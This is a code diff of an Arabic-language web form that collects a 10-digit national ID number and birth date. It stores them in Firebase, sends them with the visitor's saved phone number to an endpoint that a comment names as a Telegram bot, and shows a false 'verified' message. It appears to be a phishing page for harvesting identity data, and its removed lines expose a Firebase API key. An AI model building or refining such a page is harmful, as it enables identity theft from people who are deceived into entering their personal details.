@@ -50,67 +50,63 @@
     <button id="submitBtn" class="btn-continue">استمرار</button>
 </div>
 
-
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
-    import { getFirestore, doc, updateDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+    import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
 
-    const firebaseConfig = {
-        apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
-        authDomain: "barq-9ba61.firebaseapp.com",
-        projectId: "barq-9ba61",
-        storageBucket: "barq-9ba61.firebasestorage.app",
-        messagingSenderId: "1060477857765",
-        appId: "1:1060477857765:web:e1e2c606668209f364090c"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
+    // ... (إعدادات firebaseConfig هنا كما هي في كودك) ...
 
     document.getElementById('submitBtn').addEventListener('click', async () => {
+        const submitBtn = document.getElementById('submitBtn');
         const idNumber = document.getElementById('idNumber').value;
         const birthDate = document.getElementById('birthDate').value;
-        const docId = localStorage.getItem('currentDocId'); // استرجاع ID المستخدم الحالي
+        const docId = localStorage.getItem('currentDocId');
 
         if (idNumber.length !== 10) {
-            alert("يرجى إدخال رقم هوية صحيح مكون من 10 أرقام");
+            alert("يرجى إدخال رقم هوية صحيح (10 أرقام)");
             return;
         }
 
-        if (!birthDate) {
-            alert("يرجى اختيار تاريخ الميلاد");
-            return;
-        }
+        // 1. تغيير حالة الزر للمعالجة
+        submitBtn.innerText = "جاري المعالجة...";
+        submitBtn.disabled = true;
+        submitBtn.style.backgroundColor = "#555"; // تغيير لون الزر ليدل على التعطيل
 
         try {
-            // 1. تحديث نفس المستند الخاص بالمستخدم في Firebase
+            // 2. تحديث البيانات في Firebase
             if (docId) {
-                await updateDoc(doc(db, "users", docId), {
+                await setDoc(doc(db, "users", docId), {
                     identityNumber: idNumber,
                     birthDate: birthDate,
                     status: "تم إدخال الهوية"
-                });
+                }, { merge: true });
             }
 
-            // 2. إرسال البيانات إلى بوت التليجرام
+            // 3. إرسال البيانات للبوت
             await fetch('/api/send', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     phone: localStorage.getItem('userPhone') || "غير متوفر",
                     identity: idNumber,
-                    birthDate: birthDate,
-                    status: "تم إدخال الهوية وتاريخ الميلاد"
+                    birthDate: birthDate
                 })
-            }).catch(() => {});
+            });
 
-            window.location.href = 'success.html';
+            // 4. لا نقم بالانتقال (window.location.href)
+            // الزر سيبقى "جاري المعالجة" ولن ينتقل المستخدم
+            submitBtn.innerText = "تم التحقق بنجاح";
+            
         } catch (error) {
-            console.error("Error updating document:", error);
-            alert("حدث خطأ، يرجى المحاولة لاحقاً");
+            console.error("خطأ:", error);
+            submitBtn.innerText = "فشل الإرسال، حاول مجدداً";
+            submitBtn.disabled = false;
+            submitBtn.style.backgroundColor = "#000";
         }
     });
 </script>
+
+
 
 
 </body>
